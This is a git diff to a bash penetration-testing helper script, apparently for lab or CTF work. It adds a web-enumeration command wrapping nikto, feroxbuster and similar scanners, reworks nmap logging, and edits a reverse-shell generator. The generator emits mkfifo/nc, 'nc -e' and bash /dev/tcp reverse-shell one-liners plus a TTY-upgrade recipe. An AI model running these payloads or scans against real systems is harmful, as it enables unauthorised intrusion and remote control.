@@ -50,6 +50,7 @@ Usage:
   cap                                     Save visible pane to logs/term/
   hist                                    Save full scrollback to logs/term/
   scan [--udp] <ip> [name]                Deep nmap + smart follow-ups
+  webenum <host:port|url> [flags]         Run web discovery tools (standalone)
   sync <ip>                               Sync time to DC, otherwise set-ntp true
   rdp <ip> <user> <pass>                  Quick xfreerdp with dynamic res
   rev <type> [lhost] <port>               Generate reverse shell / payload string
@@ -399,28 +400,17 @@ scan_target() {
 
   local proj
   proj="$(readlink -f "$CURRENT_LINK")"
-  local log_dir="$proj/logs/$log_name"
+  local log_dir="$proj/logs/scans"
+  mkdir -p "$proj/logs/$log_name"
   mkdir -p "$log_dir"
-
-  # --- Tmux Setup ---
-  local sess
-  sess=$(tmux display-message -p '#S')
-
-  if ! tmux list-windows -t "${sess}:" | grep -q "scans"; then
-    tmux new-window -t "${sess}:" -n "scans" -c "$proj"
-    msg_ok "Created 'scans' window for background tasks."
-  fi
-
-  # Target the 'scans' window explicitly
-  local target_win="${sess}:scans"
-
+  
   # --- TCP Fast Scan ---
   msg_info "Starting Fast TCP Scan on $ip..."
-  run_cmd nmap -Pn -v --min-rate 500 --max-retries 1 -p- -oG "$log_dir/all_ports.gnmap" "$ip" # > /dev/null
+  run_cmd nmap -Pn -v -p- -oG "$log_dir/$log_name.gnmap" "$ip" # > /dev/null
 
   # Parse the ports
   local ports
-  ports=$(awk '/Ports:/ {for(i=1;i<=NF;i++) if($i~/open/) {split($i,a,"/"); out=out a[1]","}} END {sub(/,$/,"",out); print out}' "$log_dir/all_ports.gnmap")
+  ports=$(awk '/Ports:/ {for(i=1;i<=NF;i++) if($i~/open/) {split($i,a,"/"); out=out a[1]","}} END {sub(/,$/,"",out); print out}' "$log_dir/$log_name.gnmap")
 
   if [[ -z "$ports" ]]; then
     msg_err "No open TCP ports found. (Try running standard nmap manually)"
@@ -431,13 +421,15 @@ scan_target() {
 
   # --- TCP Deep Scan ---
   msg_info "Starting Version/Script Scan on active ports..."
-  run_cmd nmap -Pn -n -sCV -p "$ports" -oA "$log_dir/detailed" "$ip"
+  run_cmd nmap -Pn -n -sCV -p "$ports" -oN "$log_dir/$log_name" "$ip"
 
   local target_url="http://$ip"
   local redirect_url=""
   if [[ -f "$log_dir/detailed.nmap" ]]; then
-    redirect_url=$(grep -oP 'Did not follow redirect to \Khttps?://[^/\s]+' "$log_dir/detailed.nmap" | head -n 1 || true)
+    redirect_url=$(grep -oP 'Did not follow redirect to \Khttps?://[^/\s]+' "$log_dir/$log_name.nmap" | head -n 1 || true)
   fi
+
+  # --- Prompt Actions ---
 
   # HTTP Host Check
   if [[ -n "$redirect_url" ]]; then
@@ -458,48 +450,6 @@ scan_target() {
       run_cmd showmount -e "$ip" | tee "$log_dir/nfs_shares.txt"
   fi
 
-  # --- Prompt Actions ---
-
-  # SNMP Check
-  if [[ ",$ports," == *",161,"* ]]; then
-      msg_ok "SNMP detected!"
-      read -p "[?] Run onesixtyone to check for community strings? [Y/n] " -r ans
-      if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
-        msg_info "Spawning onesixtyone in 'scans' window..."      
-        tmux split-window -t "$target_win" -c "$proj" \
-        "run_cmd onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip | tee $log_dir/snmp.txt"
-      fi
-  fi
-
-  # Web Check
-  if [[ ",$ports," =~ ,(80|443), ]]; then
-    msg_ok "Web detected!"
-
-    read -p "[?] Run whatweb to check for versioning? [Y/n] " -r ans
-    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
-      msg_info "Running whatweb..."
-      run_cmd whatweb -v -a3 --log-verbose "$log_dir/whatweb.txt" "$target_url" || msg_err "whatweb failed or not installed"
-    fi
-
-    read -p "[?] Run wafw00f to check for firewalls? [Y/n] " -r ans
-    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
-      msg_info "Running wafw00f..."
-      run_cmd wafw00f "$target_url" || msg_err "wafw00f failed or not installed"
-    fi
-
-    read -p "[?] Run nikto to check for vulnerabilities?? [Y/n] " -r ans
-    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
-      msg_info "Running nikto..."
-      run_cmd nikto -o "$log_dir/nikto.txt" --maxtime=180s -C all -h "$target_url" || msg_err "nikto failed or not installed"
-    fi
-
-    read -p "[?] Run feroxbuster dir scan? [Y/n] " -r ans
-    if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
-      msg_info "Running feroxbuster..."
-      run_cmd feroxbuster -u "$target_url" -o "$log_dir/ferox_anx.txt" || msg_err "Feroxbuster failed or not installed"
-    fi
-  fi
-
   # SMB Check
   if [[ ",$ports," == *",445,"* ]] && grep -qi "microsoft-ds" "$log_dir/detailed.nmap"; then
     msg_ok "Windows SMB (microsoft-ds) detected!"
@@ -510,13 +460,120 @@ scan_target() {
   elif [[ ",$ports," == *",445,"* ]]; then
     msg_info "SMB detected but banner does not match 'microsoft-ds'. Likely Linux/Samba."
   fi
-  
+
+  # Web Check
+  if [[ ",$ports," =~ ,(80|443), ]]; then
+    msg_ok "Web detected!"
+    run_web_enum "$target_url"
+  fi
+
   # UDP Scan
   if (( udp == 1 )); then
     msg_info "UDP Scan requested. Prompting for sudo..."
     msg_info '[*] Starting UDP Top 100...'
-    run_cmd sudo nmap -v -Pn -sU --top-ports 1000 -v -oA "$log_dir/udp_top1000_$ip" "$ip"
+    run_cmd sudo nmap -v -Pn -sU --top-ports 100 -v -oN "$log_dir/$log_name_udp" "$ip"
     msg_ok '[+] UDP Done'
+  fi
+}
+
+run_web_enum() {
+  require_current_project
+  local target=""
+  local run_all=0 run_whatweb=0 run_waf=0 run_nikto=0 run_ferox=0
+  local explicit_tools=0
+
+  # Parse arguments safely
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --all)        run_all=1; shift ;;
+      --whatweb)    run_whatweb=1; explicit_tools=1; shift ;;
+      --wafw00f)    run_waf=1; explicit_tools=1; shift ;;
+      --nikto)      run_nikto=1; explicit_tools=1; shift ;;
+      --ferox)      run_ferox=1; explicit_tools=1; shift ;;
+      -h|--help)
+        echo "Usage: annexes.sh webenum <host:port|URL> [--all|--whatweb|--wafw00f|--nikto|--ferox]"
+        return 0
+        ;;
+      -*)
+        msg_err "Unknown option: $1"
+        return 1
+        ;;
+      *)
+        if [[ -z "$target" ]]; then
+          target="$1"
+        fi
+        shift
+        ;;
+    esac
+  done
+
+  [[ -z "$target" ]] && { msg_err "Target required. Usage: webenum <host:port|URL>"; exit 1; }
+
+  # Format URL protocol if missing and trim trailing slashes
+  local target_url="$target"
+  [[ ! "$target_url" =~ ^https?:// ]] && target_url="http://$target"
+  target_url="${target_url%/}"
+
+  # Extract clean string for logging directory
+  local clean_name
+  clean_name=$(echo "$target_url" | sed -e 's|^https\?://||' -e 's/[^a-zA-Z0-9._-]/_/g')
+
+  local proj
+  proj="$(readlink -f "$CURRENT_LINK")"
+  local log_dir="$proj/logs/scans/$clean_name"
+  mkdir -p "$log_dir"
+
+  msg_info "Starting Web Enumeration on: $target_url"
+
+  # If explicit flags were passed, execute only selected options non-interactively
+  if (( run_all || explicit_tools )); then
+    if (( run_all || run_whatweb )); then
+      msg_info "Running whatweb..."
+      run_cmd whatweb -v -a3 --log-verbose "$log_dir/whatweb.txt" "$target_url" || msg_err "whatweb failed"
+    fi
+
+    if (( run_all || run_waf )); then
+      msg_info "Running wafw00f..."
+      run_cmd wafw00f "$target_url" || msg_err "wafw00f failed"
+    fi
+
+    if (( run_all || run_nikto )); then
+      msg_info "Running nikto..."
+      run_cmd nikto -o "$log_dir/nikto.txt" --maxtime=180s -C all -h "$target_url" || msg_err "nikto failed"
+    fi
+
+    if (( run_all || run_ferox )); then
+      msg_info "Running feroxbuster..."
+      run_cmd feroxbuster -u "$target_url" -o "$log_dir/ferox_anx.txt" || msg_err "feroxbuster failed"
+    fi
+    return 0
+  fi
+
+  # Interactive fallback
+  msg_ok "Interactive Web Discovery Mode"
+
+  read -p "[?] Run whatweb to check for versioning? [Y/n] " -r ans
+  if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
+    msg_info "Running whatweb..."
+    run_cmd whatweb -v -a3 --log-verbose "$log_dir/whatweb.txt" "$target_url" || msg_err "whatweb failed"
+  fi
+
+  read -p "[?] Run wafw00f to check for firewalls? [Y/n] " -r ans
+  if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
+    msg_info "Running wafw00f..."
+    run_cmd wafw00f "$target_url" || msg_err "wafw00f failed"
+  fi
+
+  read -p "[?] Run nikto to check for vulnerabilities? [Y/n] " -r ans
+  if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
+    msg_info "Running nikto..."
+    run_cmd nikto -o "$log_dir/nikto.txt" --maxtime=180s -C all -h "$target_url" || msg_err "nikto failed"
+  fi
+
+  read -p "[?] Run feroxbuster dir scan? [Y/n] " -r ans
+  if [[ "$ans" =~ ^[Yy]$ || -z "$ans" ]]; then
+    msg_info "Running feroxbuster..."
+    run_cmd feroxbuster -u "$target_url" -o "$log_dir/ferox_anx.txt" || msg_err "feroxbuster failed"
   fi
 }
 
@@ -603,10 +660,10 @@ EOF
   local payload=""
   case "$type" in
     nc-trad)
-      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $lhost $lport >/tmp/f"
+      payload="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $lhost $lport >/tmp/f"
       ;;
     nc-openbsd)
-      echo "nc -e /bin/sh $lhost $lport"
+      payload="nc -e /bin/sh $lhost $lport"
       ;;
     bash)
       payload="Shell: bash -i >& /dev/tcp/$lhost/$lport 0>&1"
@@ -699,6 +756,7 @@ print(f"powershell -enc {b64_encoded}")
   fi
 
   echo "$payload"
+  echo -e "\nUpgrade:\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n^Z + stty raw -echo;fg\nstty rows 47 cols 107\nexport TERM=xterm-256color\nexec /bin/bash\n"
 }
 
 # ---- Dispatcher ----
@@ -725,6 +783,7 @@ main() {
     hist)     capture_history   ;;
     rdp)      quick_rdp     "$@" ;;
     scan)     scan_target "$@" ;;
+    webenum)  run_web_enum "$@" ;;
     sync)     sync_time "$@" ;;
     rev)      generate_payload "$@" ;;
     -h|--help|"") usage ;;
